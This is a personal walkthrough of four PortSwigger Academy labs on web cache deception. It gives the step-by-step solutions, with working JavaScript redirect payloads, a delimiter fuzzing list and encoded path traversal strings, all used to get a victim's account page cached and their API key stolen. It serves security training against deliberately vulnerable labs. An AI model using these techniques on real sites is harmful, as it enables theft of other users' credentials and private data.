---
created: 2026-05-21
---

| `#`  | Solved? | Name                                                           | Date    |
| ---- | ------- | -------------------------------------------------------------- | ------- |
| `1.` | `✓`     | Exploiting path mapping for web cache deception                | `21.05` |
| `2.` | `✓`     | Exploiting path delimiters for web cache deception             | `23.05` |
| `3.` | `✓`     | Exploiting origin server normalization for web cache deception | `23.05` |
| `4.` | `✓`     | Exploiting cache server normalization for web cache deception  | `23.05` |

## 1. Exploiting path mapping for web cache deception

>[!done]

>[!note]+ Lab description
> - [`Lab: Exploiting path mapping for web cache deception`](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping)
> - Level: #Apprentice 
> 
> To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.

### Solution

- Log in as `wiener` and navigate to your account. The account contains your API key:

![[images/walkthrough/PortSwigger/Web Cache Deception/lab1/1.png]]


- Observe that appending a non-existent static resource, such as `wcd.css`, to the `/my-account` endpoint results in identical response from the server:

![[images/walkthrough/PortSwigger/Web Cache Deception/lab1/2.png]]

![[images/walkthrough/PortSwigger/Web Cache Deception/lab1/3.png]]

- In the response headers, notice `X-Cache: hit`. This indicates the cache server treats the response as static, likely based on the extension, and caches it:

![[images/walkthrough/PortSwigger/Web Cache Deception/lab1/4.png]]

- Adding a cache buster, such as `?a=b`, causes `X-Cache: miss` response, which further confirms the `X-Cache` header as a caching oracle. 

- Go to exploit server and replace the response body with a redirect to `my-account/pwned.css`:

```HTML
<script>
window.location = "https://0a9d00d9038635128037f38800210094.web-security-academy.net/my-account/pwned.css"
</script>
```

![[images/walkthrough/PortSwigger/Web Cache Deception/lab1/6.png]]


- `Store` and `Deliver exploit to victim` several times. Then navigate to the same endpoint.

![[images/walkthrough/PortSwigger/Web Cache Deception/lab1/7.png]]

- You `hit` the `carlos`'s account page with their API key. Copy the key and submit it as a solution.

![[images/walkthrough/PortSwigger/Web Cache Deception/lab1/solved.png]]

Solved!

## 2. Exploiting path delimiters for web cache deception

>[!done]

>[!note]+ Lab description
> - [`Lab: Exploiting path delimiters for web cache deception`](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-delimiters)
> - Level: #Practitioner 
> 
> To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.
> 
> We have provided a list of possible delimiter characters to help you solve the lab: [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list).

### Solution

- Log in as `wiener` and navigate to your account. See an API key in your profile:

![[images/walkthrough/PortSwigger/Web Cache Deception/lab2/1.png]]

- Send the request to `/my-account` to Repeater.
- Observe there are no response headers that would indicate a public cache to not store it as containing sensitive information:

![[images/walkthrough/PortSwigger/Web Cache Deception/lab2/2.png]]

- Add a random prefix, such as `/my-accountwcd.css`. Observe the application response with `404`:

![[images/walkthrough/PortSwigger/Web Cache Deception/lab2/3.png]]

- This means that, without a delimiter, the application recognizes the path as a separate resource and tries to fetch. 
- Additionally, notice the response contains the `X-Cache: miss` header. Repeating the request results in `X-Cache: hit`:

![[images/walkthrough/PortSwigger/Web Cache Deception/lab2/4.png]]

- Send the request to `Intruder` and paste the list of delimiters as payload. 
- Add a cache buster with a random value.
- **Turn off URL-encoding**.

>[!note]- Delimiter list
> 
> ```
> !
> "
> #
> $
> %
> &
> '
> (
> )
> *
> +
> ,
> -
> .
> /
> :
> ;
> <
> =
>
> ?
> @
> [
> \
> ]
> ^
> _
> `
> {
> |
> }
> ~
> %21
> %22
> %23
> %24
> %25
> %26
> %27
> %28
> %29
> %2A
> %2B
> %2C
> %2D
> %2E
> %2F
> %3A
> %3B
> %3C
> %3D
> %3E
> %3F
> %40
> %5B
> %5C
> %5D
> %5E
> %5F
> %60
> %7B
> %7C
> %7D
> %7E
> ```

![[images/walkthrough/PortSwigger/Web Cache Deception/lab2/5.png]]

- Start the attack. 
- Sort the results by status code and find those with `200 OK`:

![[images/walkthrough/PortSwigger/Web Cache Deception/lab2/6.png]]

- Notice that the semicolon delimiter returns the same response as without the delimiter at all.
- Check the same delimiter in `Repeater`:

![[images/walkthrough/PortSwigger/Web Cache Deception/lab2/7.png]]

- Ensure that after sending the request several times you see `X-Cache: hit`:

![[images/walkthrough/PortSwigger/Web Cache Deception/lab2/8.png]]

- Go to Exploit server and construct the attack:

```HTML
<script>
window.location = "https://0a9000090496b64e80362b63003a004f.web-security-academy.net/my-account;wcd.css?cb=11"
</script>
```

![[images/walkthrough/PortSwigger/Web Cache Deception/lab2/9.png]]

- `Store` and `Deliver exploit to victim` several times to ensure the response is cached.
- Then immediately navigate to the same page with the same cache buster:

```powershell
https://0a9000090496b64e80362b63003a004f.web-security-academy.net/my-account;wcd.css?cb=11
```

![[images/walkthrough/PortSwigger/Web Cache Deception/lab2/10.png]]

- You hit the `carlos`'s response. Submit their API key as a solution.

![[images/walkthrough/PortSwigger/Web Cache Deception/lab2/solved.png]]
 
 Solved!
## 3. Exploiting origin server normalization for web cache deception

>[!done]

>[!note]+ Lab description
> - [`Lab: Exploiting origin server normalization for web cache deception`](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization)
> - Level: #Practitioner 
> 
> 
> To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.
> 
> We have provided a list of possible delimiter characters to help you solve the lab: [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list).

### Solution

- Log in as `wiener` and navigate to your account at `/my-account`. See the sensitive API key. 
- Send this request `Repeater`. Assuming this lab is not about delimiters unlike the previous (normally you'd check), test for origin normalization:

```powershell
/static/..%2Fmy-account
```

![[images/walkthrough/PortSwigger/Web Cache Deception/lab3/1.png]]

- The application normalizes the path and returns your account page as if no `/static/../` was inserted. 
- There are, however, no direct indicators of whether the response is cached or not. 

- In HTTP history, notice all static resources start with `/resources`. The cache server might be configured to store all responses with this path segment.

- Construct the exploit:

```html
<script>
window.location = "https://0aa0000e03dc09c280000342006c003f.web-security-academy.net/resources/..%2Fmy-account?cb=2"
</script>
```

- `Store` and `View exploit` several times. Then navigate to the same page from an Incognito window:

![[images/walkthrough/PortSwigger/Web Cache Deception/lab3/2.png]]

- You see your own account.
- Change the cache buster and `Deliver exploit to victim` several times.
- Then navigate to the page with the same cache buster:

![[images/walkthrough/PortSwigger/Web Cache Deception/lab3/3.png]]

- You hit `carlos`'s page.
- Submit their API key as a lab solution.

![[images/walkthrough/PortSwigger/Web Cache Deception/lab3/solved.png]]

Solved!
## 4. Exploiting cache server normalization for web cache deception

>[!done]

>[!note]+ Lab description
> - [`Lab: Exploiting cache server normalization for web cache deception`](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization)
> - Level: #Practitioner 
> 
> To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.
> 
> We have provided a list of possible delimiter characters to help you solve the lab: [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list).

### Solution

- This lab has a different model, where the cache normalizes, origin does not:

```powershell
/<dynamic-resource><delimiter>%2f%2e%2e%2f<static-directory-prefix>
```

- Log in as `wiener` and send the request to `Repeater`. Add an arbitrary prefix with no delimiter to ensure the application responds with `404`. 
- Then add the encoded path traversal sequence:

```powershell
/my-account%2f%2e%2e%2fresources
```

- If the cache normalizes this, it will  decode this to `/my-account/../resources` and normalize as `/resources`. Using a path-matching rule, it will cache the resource. 
- However, you still need to make the origin ignore everything after `/my-account` so it responds with dynamic sensitive content and not an error.

![[images/walkthrough/PortSwigger/Web Cache Deception/lab4/1.png]]

- Send the request to `Intruder` and enumerate the delimiters:

>[!note]- Delimiter list
> 
> ```
> !
> "
> #
> $
> %
> &
> '
> (
> )
> *
> +
> ,
> -
> .
> /
> :
> ;
> <
> =
>
> ?
> @
> [
> \
> ]
> ^
> _
> `
> {
> |
> }
> ~
> %21
> %22
> %23
> %24
> %25
> %26
> %27
> %28
> %29
> %2A
> %2B
> %2C
> %2D
> %2E
> %2F
> %3A
> %3B
> %3C
> %3D
> %3E
> %3F
> %40
> %5B
> %5C
> %5D
> %5E
> %5F
> %60
> %7B
> %7C
> %7D
> %7E
> ```

![[images/walkthrough/PortSwigger/Web Cache Deception/lab4/2.png]]

- Start the attack.
- In the results, sort by the status code and find `200 OK` responses. 
- One of the `200` delimiters is a URL-encoded `#` character, `%23`. Send this request to `Repeater`.
- Send the request several times and see `X-Cache: hit`. The response itself is, however, as if there were no delimiter at all.

![[images/walkthrough/PortSwigger/Web Cache Deception/lab4/4.png]]

- This means that the cache treats the path as simply `/resources`, decoding it, but sends the full URL to the origin, which truncates the fragment. 
- Craft an exploit:

```html
<script>
window.location = "https://0ad3008d049812758027030c00e900d4.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?cb=2"
</script>
```

- `Store` and `Deliver exploit to victim` several times.
- Then navigate to the same URL:

![[images/walkthrough/PortSwigger/Web Cache Deception/lab4/5.png]]

- See the `carlos`'s page. Submit their API key as a solution.

![[images/walkthrough/PortSwigger/Web Cache Deception/lab4/solved.png]]


Solved!